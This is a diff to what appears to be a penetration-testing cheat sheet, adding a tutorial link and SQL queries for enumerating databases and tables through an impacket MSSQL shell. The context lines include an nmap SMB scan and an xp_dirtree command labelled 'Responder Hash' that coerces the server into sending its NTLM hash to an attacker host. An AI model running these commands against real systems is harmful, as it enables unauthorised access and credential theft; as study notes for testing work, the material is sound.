@@ -566,6 +566,8 @@ nmap -v -p 139, 445 --script=smb-os-discovery {IP ADDRESS}
 
 <br />
 
+[https://www.tutorialspoint.com/sql/sql-select-database.htm](https://www.tutorialspoint.com/sql/sql-select-database.htm)
+
 ```bash
 
 
@@ -579,6 +581,18 @@ impacket-mssqlclient {USERNAME}:'{PASSWORD}'@{IP ADDRESS} -windows-auth
 
 # SQL SHELL
 sql> help
+
+# Query Database Names
+sql> SELECT name FROM master.sys.databases
+
+# Select Database
+sql> USE DatabaseName;
+
+# Query All Table names
+sql> SELECT * FROM INFORMATION_SCHEMA.TABLES;
+
+# Query Table Information
+sql> SELECT * FROM TABLE;
 
 # Responder Hash
 sql> xp_dirtree "\\{IP ADDRESS}\test"
